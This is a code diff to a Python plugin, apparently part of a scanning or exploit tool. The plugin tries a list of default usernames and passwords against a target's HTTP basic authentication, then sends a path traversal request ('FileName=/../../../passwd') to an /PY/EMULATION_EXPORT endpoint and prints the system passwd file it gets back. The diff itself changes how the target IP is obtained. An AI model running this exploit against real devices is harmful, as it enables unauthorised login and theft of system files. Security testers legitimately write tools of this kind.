@@ -44,16 +44,16 @@ class Plugin(IPlugin):
         for username, passwd in self.list_auth:
             res = requests.get(data.url, allow_redirects=True,
                                     verify=False, timeout=2, 
-                                    auth=HTTPBasicAuth(username, passwd))
+                                    auth=HTTPBasicAuth(username, passwd),
+                                    stream=True)
             if res.status_code == 200:
                 print(username, ":", passwd, " still used ...")
             else:
                 print(username, " password changed")
-        ip = re.findall(r'[0-9]+(?:\.[0-9]+){3}', data.url)[0]
+        ip = res.raw._connection.sock.getpeername()[0]
         url = 'http://{}:{}{}'.format(ip, 80, "/PY/EMULATION_EXPORT")
         passwd_file_res = requests.post(url, allow_redirects=True,
                                     verify=False, timeout=2, 
                                     auth=HTTPBasicAuth(username, passwd),
-                                    data="FileName=/../../../passwd",
-                                    stream=True)
+                                    data="FileName=/../../../passwd")
         print ("\noups ... a passwd file:\n", passwd_file_res.text)
